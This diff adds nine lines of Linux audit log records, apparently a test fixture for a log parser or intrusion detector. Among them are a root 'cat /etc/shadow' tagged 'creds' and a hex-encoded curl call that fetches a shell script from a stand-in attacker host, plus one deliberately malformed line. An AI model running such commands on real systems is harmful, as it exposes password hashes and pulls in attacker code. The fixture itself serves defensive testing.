@@ -1,0 +1,9 @@
+type=SYSCALL msg=audit(1780000000.101:201): arch=c000003e syscall=59 success=yes exit=0 ppid=1400 pid=1401 auid=1000 uid=0 gid=0 euid=0 comm="cat" exe="/usr/bin/cat" key="creds"
+type=EXECVE msg=audit(1780000000.101:201): argc=2 a0="cat" a1="/etc/shadow"
+type=CWD msg=audit(1780000000.101:201): cwd="/root"
+type=PATH msg=audit(1780000000.101:201): item=0 name="/usr/bin/cat" inode=131 dev=08:01 mode=0100755
+type=SYSCALL msg=audit(1780000000.250:202): arch=c000003e syscall=59 success=yes exit=0 ppid=1400 pid=1410 auid=1000 uid=1000 gid=1000 euid=1000 comm="curl" exe="/usr/bin/curl" key=(null)
+type=EXECVE msg=audit(1780000000.250:202): argc=3 a0="curl" a1="-s" a2=68747470733A2F2F6576696C2E6578616D706C652F702E7368
+this line is not an audit record
+type=SYSCALL msg=audit(1780000000.400:203): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=1500 auid=4294967295 uid=0 gid=0 euid=0 comm="ls" exe="/usr/bin/ls"
+type=EXECVE msg=audit(1780000000.400:203): argc=1 a0="ls"
